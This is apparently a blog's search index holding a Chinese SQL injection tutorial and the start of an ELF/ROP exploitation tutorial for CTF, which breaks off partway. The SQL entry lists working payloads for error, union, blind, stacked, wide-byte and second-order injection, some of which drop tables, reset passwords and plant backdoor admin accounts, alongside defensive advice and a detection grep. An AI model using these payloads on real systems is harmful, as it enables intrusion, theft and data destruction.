<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SQL注入攻击详解</title>
    <link href="/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入攻击详解"><a href="#SQL注入攻击详解" class="headerlink" title="SQL注入攻击详解"></a>SQL注入攻击详解</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入作为Web应用程序中最常见的安全漏洞之一，至今仍是攻击者利用的主要手段。本文将详细讲解SQL注入的各种利用方式，帮助安全研究人员和开发者深入理解这一经典漏洞。</p><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p><strong>SQL注入（SQL Injection）</strong> 是一种将恶意SQL语句插入原本正常查询中的攻击方式。攻击者通过在用户输入中注入特殊的SQL代码，可以控制数据库的查询逻辑，进而读取、修改甚至执行系统命令。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>当Web应用程序未对用户输入进行充分验证和过滤时，攻击者提交的恶意输入会被直接拼接到SQL查询语句中，导致原有的查询逻辑被改变。</p><h2 id="SQL注入类型详解"><a href="#SQL注入类型详解" class="headerlink" title="SQL注入类型详解"></a>SQL注入类型详解</h2><h3 id="1-错误注入（Error-based-Injection）"><a href="#1-错误注入（Error-based-Injection）" class="headerlink" title="1. 错误注入（Error-based Injection）"></a>1. 错误注入（Error-based Injection）</h3><p><strong>攻击原理</strong>：通过注入有语法错误或运行错误的SQL语句，使数据库抛出报错信息，从错误信息中提取字段、表名、数据库版本等敏感信息。</p><p><strong>核心关键字</strong>：</p><ul><li><code>extractvalue()</code> - XML路径提取函数</li><li><code>updatexml()</code> - XML更新函数</li><li><code>floor(rand(0)*2)</code> - 随机数取整函数</li><li><code>group by</code> - 分组查询</li></ul><p><strong>经典payload示例</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, <span class="hljs-keyword">user</span>(), <span class="hljs-number">0x7e</span>))<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, <span class="hljs-keyword">database</span>(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(), floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)) <span class="hljs-keyword">having</span> min(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>技术细节</strong>：</p><ul><li><code>extractvalue()</code>函数在参数格式错误时会抛出详细的错误信息</li><li><code>0x7e</code>代表波浪号<code>~</code>，用作数据分隔符便于识别</li><li>通过构造特定的错误条件，可以在报错中泄露数据库敏感信息</li></ul><h3 id="2-联合查询注入（Union-based-Injection）"><a href="#2-联合查询注入（Union-based-Injection）" class="headerlink" title="2. 联合查询注入（Union-based Injection）"></a>2. 联合查询注入（Union-based Injection）</h3><p><strong>攻击原理</strong>：通过<code>union select</code>语句将攻击者指定的查询结果与原始查询结果合并，从而在页面上直接显示数据库中的敏感数据。</p><p><strong>核心关键字</strong>：</p><ul><li><code>union select</code> - 联合查询</li><li><code>null</code> - 空值占位符</li><li><code>order by</code> - 字段排序（用于探测列数）</li><li><code>from dual</code> - Oracle数据库虚拟表</li></ul><p><strong>探测与利用流程</strong>：</p><ol><li><strong>确定字段数量</strong>：</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> <span class="hljs-comment">--</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><ol><li><strong>构造联合查询</strong>：</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>(),version() <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><ol><li><strong>提取敏感数据</strong>：</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-built_in">table_name</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="3-时间延时注入（Time-based-Injection）"><a href="#3-时间延时注入（Time-based-Injection）" class="headerlink" title="3. 时间延时注入（Time-based Injection）"></a>3. 时间延时注入（Time-based Injection）</h3><p><strong>攻击原理</strong>：通过执行数据库延时函数，根据HTTP响应时间判断注入条件的真假。这种方法特别适用于无页面回显的盲注场景。</p><p><strong>不同数据库的延时函数</strong>：</p><ul><li><strong>MySQL</strong>: <code>sleep(x)</code>, <code>benchmark(count, expr)</code></li><li><strong>PostgreSQL</strong>: <code>pg_sleep(x)</code></li><li><strong>Oracle</strong>: <code>dbms_pipe.receive_message(&#39;&#39;,x)</code></li><li><strong>SQL Server</strong>: <code>waitfor delay &#39;00:00:0x&#39;</code></li></ul><p><strong>典型payload</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>) <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>, benchmark(<span class="hljs-number">5000000</span>,md5(<span class="hljs-string">&#x27;test&#x27;</span>)), <span class="hljs-number">0</span>) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>盲注自动化技巧</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 逐位判断数据库名<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>, sleep(<span class="hljs-number">2</span>), <span class="hljs-number">0</span>)<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span>, sleep(<span class="hljs-number">2</span>), <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h3 id="4-布尔盲注（Boolean-based-Blind-Injection）"><a href="#4-布尔盲注（Boolean-based-Blind-Injection）" class="headerlink" title="4. 布尔盲注（Boolean-based Blind Injection）"></a>4. 布尔盲注（Boolean-based Blind Injection）</h3><p><strong>攻击原理</strong>：通过构造布尔表达式，根据页面返回内容的差异来推测数据库信息。当条件为真时页面正常显示，条件为假时页面异常或内容发生变化。</p><p><strong>核心函数与技巧</strong>：</p><ul><li><code>substr(str, pos, len)</code> - 字符串截取</li><li><code>ascii(char)</code> - 字符转ASCII码</li><li><code>length(str)</code> - 字符串长度</li><li><code>like</code> - 模糊匹配</li></ul><p><strong>实战示例</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 判断数据库名长度<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">8</span> <span class="hljs-comment">--</span><br><br># 逐位爆破数据库名<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span> <span class="hljs-comment">--  # &#x27;s&#x27;</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span> <span class="hljs-comment">--  # &#x27;e&#x27;</span><br><br># 使用<span class="hljs-keyword">like</span>进行模糊匹配<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sec%&#x27;</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="5-堆叠查询注入（Stacked-Query-Injection）"><a href="#5-堆叠查询注入（Stacked-Query-Injection）" class="headerlink" title="5. 堆叠查询注入（Stacked Query Injection）"></a>5. 堆叠查询注入（Stacked Query Injection）</h3><p><strong>攻击原理</strong>：当数据库和Web应用支持在一次请求中执行多条SQL语句时，攻击者可以使用分号<code>;</code>分隔多条语句，实现更复杂的攻击操作。</p><p><strong>支持情况</strong>：</p><ul><li><strong>MySQL</strong>: 需要使用<code>multi_query()</code>函数，默认不支持</li><li><strong>SQL Server</strong>: 默认支持</li><li><strong>PostgreSQL</strong>: 支持</li><li><strong>Oracle</strong>: 不支持</li></ul><p><strong>危险操作示例</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>) <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span>; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> logs <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span>; <span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;hacked&#x27;</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span>; <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> hacker identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>高级利用</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 创建新管理员账户<br>?id=<span class="hljs-number">1</span>; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> admin_users(username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">role</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;backdoor&#x27;</span>,md5(<span class="hljs-string">&#x27;secret&#x27;</span>),<span class="hljs-string">&#x27;admin&#x27;</span>) <span class="hljs-comment">--</span><br><br># 修改现有用户权限<br>?id=<span class="hljs-number">1</span>; <span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> <span class="hljs-keyword">role</span>=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;normaluser&#x27;</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="6-宽字节注入（Wide-Byte-Injection）"><a href="#6-宽字节注入（Wide-Byte-Injection）" class="headerlink" title="6. 宽字节注入（Wide Byte Injection）"></a>6. 宽字节注入（Wide Byte Injection）</h3><p><strong>攻击原理</strong>：利用多字节字符集（如GBK、GB2312）的编码特性，使转义字符<code>\</code>与注入字符组合成合法的多字节字符，从而绕过转义防护机制。</p><p><strong>技术背景</strong>：</p><ul><li>GBK编码中，一个汉字占用2个字节</li><li>某些字节组合会被解释为单个汉字字符</li><li><code>%df%5c</code> 在GBK编码下会被解释为一个汉字</li></ul><p><strong>绕过原理</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 正常情况：单引号被转义</span><br>payload: admin<span class="hljs-string">&#x27; or 1=1 --</span><br><span class="hljs-string">转义后: admin\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1 --<br><br><span class="hljs-comment"># 宽字节绕过：</span><br>payload: admin%df<span class="hljs-string">&#x27; or 1=1 --</span><br><span class="hljs-string">转义后: admin%df\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1 --<br>GBK解析: admin[汉字]<span class="hljs-string">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure><p><strong>实战payload</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>%df<span class="hljs-string">&#x27; union select 1,user(),3 --</span><br><span class="hljs-string">?id=1%df&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>())) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="7-二次注入（Second-order-Injection）"><a href="#7-二次注入（Second-order-Injection）" class="headerlink" title="7. 二次注入（Second-order Injection）"></a>7. 二次注入（Second-order Injection）</h3><p><strong>攻击原理</strong>：恶意payload在第一次请求中被正常存储到数据库，但在后续的查询中被调用时触发SQL注入。这种攻击方式具有很强的隐蔽性。</p><p><strong>攻击流程</strong>：</p><ol><li><strong>第一阶段 - 数据存储</strong>：</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 用户注册时提交恶意用户名</span><br>username: admin&#x27;<span class="hljs-comment">--</span><br><span class="hljs-comment"># 被存储到数据库中</span><br></code></pre></td></tr></table></figure><ol><li><strong>第二阶段 - 触发注入</strong>：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 管理后台查询该用户信息时<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><span class="hljs-comment">--&#x27;</span><br># 注释符导致后续条件被忽略<br></code></pre></td></tr></table></figure><p><strong>典型应用场景</strong>：</p><ul><li>用户注册&#x2F;个人信息修改</li><li>文章评论系统</li><li>文件上传功能的文件名处理</li><li>日志记录系统</li></ul><h2 id="防护措施与最佳实践"><a href="#防护措施与最佳实践" class="headerlink" title="防护措施与最佳实践"></a>防护措施与最佳实践</h2><h3 id="开发层面防护"><a href="#开发层面防护" class="headerlink" title="开发层面防护"></a>开发层面防护</h3><ol><li><strong>使用参数化查询&#x2F;预编译语句</strong></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 错误写法<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-regexp">//</span> 正确写法  <br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;prepare(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute([<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]]);<br></code></pre></td></tr></table></figure><ol><li><strong>严格的输入验证</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 白名单验证</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9]+$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid input&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 长度限制</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &gt; <span class="hljs-number">50</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Username too long&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><strong>使用ORM框架</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># Django ORM - 自动参数化<br><span class="hljs-keyword">User</span>.objects.<span class="hljs-keyword">filter</span>(id=user_id)<br><br># SQLAlchemy - 安全查询<br><span class="hljs-keyword">session</span>.query(<span class="hljs-keyword">User</span>).<span class="hljs-keyword">filter</span>(<span class="hljs-keyword">User</span>.id == user_id)<br></code></pre></td></tr></table></figure><h3 id="数据库层面防护"><a href="#数据库层面防护" class="headerlink" title="数据库层面防护"></a>数据库层面防护</h3><ol><li><strong>最小权限原则</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 创建专用应用账户，仅授予必要权限</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;webapp&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;strong_password&#x27;</span>;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span>, <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">ON</span> webapp_db.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;webapp&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-comment">-- 禁止DROP, ALTER, FILE等危险权限</span><br></code></pre></td></tr></table></figure><ol><li><strong>关闭错误信息显示</strong></li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// 生产环境关闭错误显示</span><br><span class="hljs-built_in">ini_set</span>(&#x27;display_errors&#x27;, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><ol><li><strong>启用SQL查询日志</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- MySQL启用慢查询日志</span><br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;ON&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h3 id="WAF与监控"><a href="#WAF与监控" class="headerlink" title="WAF与监控"></a>WAF与监控</h3><ol><li><strong>部署Web应用防火墙</strong></li></ol><ul><li>ModSecurity规则集</li><li>云WAF服务（阿里云、腾讯云等）</li><li>自定义过滤规则</li></ul><ol><li><strong>实时监控与告警</strong></li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 监控异常SQL查询</span><br>tail <span class="hljs-punctuation">-</span>f /var/<span class="hljs-built_in">log</span>/mysql/mysql.<span class="hljs-built_in">log</span> <span class="hljs-string">| grep -i &quot;</span>union\<span class="hljs-string">|sleep\|benchmark&quot;</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SQL注入漏洞虽然是一个”老”问题，但在实际的渗透测试和安全评估中仍然大量存在。理解各种注入类型的原理和利用方法，对于安全研究人员发现漏洞、开发人员修复漏洞都具有重要意义。</p><p><strong>关键要点回顾</strong>：</p><ul><li>错误注入利用数据库报错获取信息</li><li>联合注入通过union语句直接获取数据</li><li>时间盲注和布尔盲注适用于无回显场景</li><li>堆叠注入危险性最高，可执行任意SQL操作</li><li>宽字节注入针对特定编码环境</li><li>二次注入具有较强的隐蔽性</li></ul><p><strong>防护核心</strong>：</p><ul><li>使用参数化查询是最有效的防护手段</li><li>输入验证和输出编码同样重要</li><li>遵循最小权限原则配置数据库权限</li><li>定期进行安全评估和代码审计</li></ul><p>希望本文能够帮助读者全面理解SQL注入的攻防技术，在实际工作中更好地保护Web应用程序的安全。</p><hr><blockquote><p><strong>免责声明</strong>：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>漏洞利用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>Web安全</tag>
      
      <tag>SQL注入</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ELF 文件保护机制与 ROP 构造详解</title>
    <link href="/2025/07/22/ELF-%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E-ROP-%E6%9E%84%E9%80%A0%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/07/22/ELF-%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E-ROP-%E6%9E%84%E9%80%A0%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="ELF-文件保护机制与-ROP-构造详解"><a href="#ELF-文件保护机制与-ROP-构造详解" class="headerlink" title="ELF 文件保护机制与 ROP 构造详解"></a>ELF 文件保护机制与 ROP 构造详解</h1><p>在 CTF（Capture The Flag）竞赛和二进制漏洞利用中，理解 ELF（Executable and Linkable Format）文件的架构信息及其保护机制至关重要。本文将详细分析 ELF 文件的架构特性、常见保护机制、函数调用约定，以及如何通过 ROP（Return-Oriented Programming）技术进行漏洞利用。</p><h2 id="ELF-架构信息"><a href="#ELF-架构信息" class="headerlink" title="ELF 架构信息"></a>ELF 架构信息</h2><p>ELF 文件是 Linux 系统下常见的可执行文件格式，其架构信息直接影响漏洞利用的策略。以下是关键点：</p><ul><li><strong>目标程序架构</strong>：本文以 <code>amd64-64-little</code>（64 位小端序）为例。</li><li><strong>作用</strong>：<ul><li><strong>函数调用约定</strong>：决定了参数传递方式（如寄存器或栈）。</li><li><strong>ROP 构造</strong>：需要根据架构选择合适的 gadget。</li><li><strong>系统调用号</strong>：不同架构下系统调用号（如 <code>read</code>、<code>write</code>）存在差异。</li></ul></li></ul><h2 id="保护机制总览"><a href="#保护机制总览" class="headerlink" title="保护机制总览"></a>保护机制总览</h2><p>ELF 文件通常启用多种保护机制以增强安全性。以下是常见保护机制及其在 PWN（二进制漏洞利用）中的作用与绕过方式：</p><table><thead><tr><th>保护项</th><th>状态</th><th>说明</th><th>在 PWN 中的作用与利用方式</th></tr></thead><tbody><tr><td><strong>RELRO</strong></td><td>Partial RELRO</td><td>GOT 表部分受保护，GOT 可写</td><td>可通过 ret2got 改写函数指针（如 <code>write</code> → <code>system</code>）</td></tr><tr><td><strong>RELRO</strong></td><td>Full RELRO</td><td>GOT 表完全不可写</td><td>无法改写 GOT，只能泄露 GOT 地址后构造 ROP</td></tr><tr><td><strong>Stack Canary</strong></td><td>No Canary Found</td><td>栈无溢出检测</td><td>可直接栈溢出控制返回地址</td></tr><tr><td><strong>Stack Canary</strong></td><td>Canary Found</td><td>启用栈溢出检测机制</td><td>需先泄露 Canary 值，否则程序崩溃</td></tr><tr><td><strong>NX</strong></td><td>NX Enabled</td><td>栈不可执行</td><td>无法执行 Shellcode，需用 ROP 或 ret2libc</td></tr><tr><td><strong>PIE</strong></td><td>No PIE (固定基址，如 0x400000)</td><td>程序基址固定</td><td>地址可静态分析，ROP 构造更简单</td></tr><tr><td><strong>PIE</strong></td><td>PIE Enabled</td><td>基址随机化</td><td>需先泄露模块基址，ROP 构造更复杂</td></tr></tbody></table><h3 id="CTF-常见题型与保护机制"><a href="#CTF-常见题型与保护机制" class="headerlink" title="CTF 常见题型与保护机制"></a>CTF 常见题型与保护机制</h3><p>不同类型的 CTF 题目通常搭配特定的保护机制，影响利用方式：</p><ul><li><strong>ROP &#x2F; ret2libc 题</strong>：通常有 NX 保护，无 PIE 或仅 Partial RELRO，便于构造 ROP 链。</li><li><strong>格式化字符串题</strong>：常搭配 Full RELRO，限制 GOT 重写，需利用格式化字符串漏洞泄露地址。</li><li><strong>堆题</strong>：通常有 Stack Canary，挑战在于绕过 Canary 或利用堆漏洞。</li><li><strong>Shellcode 类题</strong>：一般无 NX 保护，允许在栈上直接执行注入的 Shellcode。</li></ul><h2 id="函数原型与调用方式"><a href="#函数原型与调用方式" class="headerlink" title="函数原型与调用方式"></a>函数原型与调用方式</h2><h3 id="常用函数原型"><a href="#常用函数原型" class="headerlink" title="常用函数原型"></a>常用函数原型</h3><p>以下是 PWN 中常用的标准库函数及其参数说明：</p><ol><li><p><strong><code>ssize_t write(int fd, const void *buf, size_t count);</code></strong></p><ul><li><code>fd</code>：文件描述符（如 <code>1</code> 表示标准输出）。</li><li><code>buf</code>：待输出数据的起始地址，可用于泄露内存内容。</li><li><code>count</code>：输出字节数，需控制以避免泄露过多数据。</li></ul></li><li><p><strong><code>ssize_t read(int fd, void *buf, size_t 